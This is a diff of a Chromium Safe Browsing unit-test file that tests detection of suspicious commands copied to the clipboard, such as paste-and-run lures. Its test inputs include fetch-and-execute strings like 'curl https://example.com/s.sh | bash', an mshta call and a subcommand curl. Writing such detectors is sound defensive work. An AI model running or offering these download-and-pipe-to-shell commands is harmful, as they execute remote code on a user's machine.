@@ -88,16 +88,6 @@ class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
               (override));
   MOCK_METHOD(void, MaybeRunUserReportCallback, (), (override));
 
-  ClipboardExtractedData ExtractClipboardData(
-      const std::u16string& payload) override {
-    extracted_payload_ = payload;
-    ClipboardExtractedData extracted_data;
-    extracted_data.add_suspicious_tokens("token_value_1");
-    return extracted_data;
-  }
-
-  std::u16string extracted_payload_;
-
   ClientSideDetectionFeatureCacheBase* GetFeatureCache() override {
     return &feature_cache_;
   }
@@ -138,6 +128,7 @@ class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
   using ClientSideDetectionHostBase::
       AddMiscellaneousMetadataToClientPhishingRequest;
   using ClientSideDetectionHostBase::CanGetAccessToken;
+  using ClientSideDetectionHostBase::ExtractClipboardData;
   using ClientSideDetectionHostBase::GetTierValue;
   using ClientSideDetectionHostBase::HasDonePreclassificationCheckOnSameURL;
   using ClientSideDetectionHostBase::HasForceRequestFromRtUrlLookup;
@@ -193,6 +184,7 @@ class ClientSideDetectionHostBaseTest : public testing::Test {
   scoped_refptr<HostContentSettingsMap> content_setting_map_;
   std::unique_ptr<VerdictCacheManager> cache_manager_;
   std::unique_ptr<TestClientSideDetectionHostBase> host_;
+  base::test::ScopedFeatureList feature_list_;
 };
 
 TEST_F(ClientSideDetectionHostBaseTest, PriorityTier) {
@@ -324,7 +316,7 @@ TEST_F(ClientSideDetectionHostBaseTest, OnTextCopiedToClipboard) {
   base::test::ScopedFeatureList feature_list;
   feature_list.InitAndEnableFeatureWithParameters(
       kClientSideDetectionClipboardCopyApi,
-      {{"MinLength", "5"}, {"MaxLength", "1000"}});
+      {{"MinLength", "10"}, {"MaxLength", "1000"}});
 
   // Enhanced Protection is disabled.
   SetEnhancedProtectionPrefForTests(&prefs_, false);
@@ -337,18 +329,19 @@ TEST_F(ClientSideDetectionHostBaseTest, OnTextCopiedToClipboard) {
   // Enable Enhanced Protection.
   SetEnhancedProtectionPrefForTests(&prefs_, true);
 
-  // Too short payload (length 3 < 5).
-  host_->OnTextCopiedToClipboard(u"abc");
+  // Too short payload (length 8 < 10).
+  host_->OnTextCopiedToClipboard(u"curl abc");
   EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
 
-  // Too long payload (length 2000 > 1000).
-  std::u16string long_payload(2000, 'a');
+  // Too long payload (length 2005 > 1000).
+  std::u16string long_payload = u"curl " + std::u16string(2000, 'a');
   host_->OnTextCopiedToClipboard(long_payload);
   EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
 
-  // Valid payload. StartPreClassification should be triggered.
+  // Valid payload. `MaybeStartPreClassification()` should be triggered.
   host_->OnTextCopiedToClipboard(
-      u"http://malicious-link-valid-length-payload.com/");
+      u"curl http://malicious-link-valid-length-payload.com/");
+  ASSERT_TRUE(host_->last_preclassification_request_type_.has_value());
   EXPECT_EQ(host_->last_preclassification_request_type_, CLIPBOARD_COPY_API);
 }
 
@@ -729,6 +722,133 @@ TEST_F(ClientSideDetectionHostBaseTest, OnIntelligentScanDoneFailure) {
 
   histograms.ExpectUniqueSample(
       "SBClientPhishing.IntelligentScanHasSuccessfulResponse", false, 1);
+}
+
+// Unit tests for ExtractClipboardData
+class ClientSideDetectionHostBaseClipboardDataTest
+    : public ClientSideDetectionHostBaseTest {
+ public:
+  ClipboardExtractedData ExtractFromPayload(const std::u16string& payload) {
+    return host_->ExtractClipboardData(payload);
+  }
+};
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, EmptyPayload) {
+  ClipboardExtractedData data = ExtractFromPayload(u"");
+  EXPECT_EQ(0, data.suspicious_tokens_size());
+  EXPECT_FALSE(data.is_first_token_suspicious());
+  EXPECT_FALSE(data.is_last_token_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, NoSusCommands) {
+  ClipboardExtractedData data = ExtractFromPayload(u"this is a normal string");
+  EXPECT_EQ(0, data.suspicious_tokens_size());
+  EXPECT_FALSE(data.is_first_token_suspicious());
+  EXPECT_FALSE(data.is_last_token_suspicious());
+  EXPECT_FALSE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest,
+       SingleSusCommandAtBeginning) {
+  ClipboardExtractedData data = ExtractFromPayload(u"curl example.com");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_FALSE(data.is_last_token_suspicious());
+  EXPECT_FALSE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, SingleSusCommandAtEnd) {
+  ClipboardExtractedData data = ExtractFromPayload(u"some text with wget");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("wget"));
+  EXPECT_FALSE(data.is_first_token_suspicious());
+  EXPECT_TRUE(data.is_last_token_suspicious());
+  EXPECT_FALSE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, SuspiciousCommand) {
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_TRUE(data.is_last_token_suspicious());
+  EXPECT_EQ(data.payload_length(), 36);
+  EXPECT_EQ(data.total_parsed_tokens(), 3);
+  EXPECT_EQ(data.urls_size(), 1);
+  EXPECT_TRUE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MissingRunner) {
+  // Loader + URL, but no runner.
+  ClipboardExtractedData data = ExtractFromPayload(u"curl https://example.com");
+  EXPECT_EQ(1, data.suspicious_tokens_size());
+  EXPECT_FALSE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MissingURL) {
+  // Loader + Runner, but no URL.
+  ClipboardExtractedData data = ExtractFromPayload(u"echo hello | bash");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("echo", "bash"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_TRUE(data.is_last_token_suspicious());
+  EXPECT_FALSE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, RemoteRunner) {
+  // Remote runner satisfies loader and runner.
+  ClipboardExtractedData data = ExtractFromPayload(u"mshta example.com");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("mshta"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_EQ(data.urls_size(), 1);
+  EXPECT_TRUE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, SubcommandSyntax) {
+  // Subcommand syntax satisfies runner.
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"$(curl http://example.com)");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl"));
+  EXPECT_EQ(data.urls_size(), 1);
+  EXPECT_TRUE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MixedCaseAndPaths) {
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"cUrL https://example.com/s /usr/bin/BaSh.exe");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_TRUE(data.is_last_token_suspicious());
+  EXPECT_TRUE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MixedDelimiters) {
+  ClipboardExtractedData data = ExtractFromPayload(
+      u"curl\thttps://e.com\rwget\nhttp://b.com|{bash};(cmd::iex)");
+  EXPECT_THAT(data.suspicious_tokens(),
+              ::testing::ElementsAre("curl", "wget", "bash", "cmd", "iex"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_TRUE(data.is_last_token_suspicious());
+  EXPECT_TRUE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, IncludeFullPayload) {
+  feature_list_.InitAndEnableFeatureWithParameters(
+      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "true"}});
+
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
+  EXPECT_TRUE(data.is_overall_suspicious());
+  EXPECT_EQ(data.content(), "curl https://example.com/s.sh | bash");
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest,
+       ExcludeFullPayloadByDefault) {
+  feature_list_.InitAndEnableFeatureWithParameters(
+      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "false"}});
+
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
+  EXPECT_TRUE(data.is_overall_suspicious());
+  EXPECT_FALSE(data.has_content());
 }
 
 }  // namespace safe_browsing
